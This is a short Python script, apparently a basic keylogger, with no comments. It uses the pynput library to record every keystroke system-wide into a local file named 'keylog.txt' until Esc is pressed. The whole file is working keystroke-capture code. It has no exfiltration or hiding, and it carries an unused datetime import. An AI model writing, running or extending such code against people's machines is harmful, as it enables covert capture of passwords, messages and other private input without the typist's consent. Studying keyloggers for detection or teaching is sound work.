import datetime
from pynput import keyboard

logfile = "keylog.txt"

def writekey(key):
    with open(logfile, "a") as f:
        f.write(key)

def on_press(key):
    try:
        writekey(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            writekey(" ")
        elif key == keyboard.Key.enter:
            writekey("\n")
        elif key == keyboard.Key.esc:
            return False
        else:
            writekey(f"<{key.name}>")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()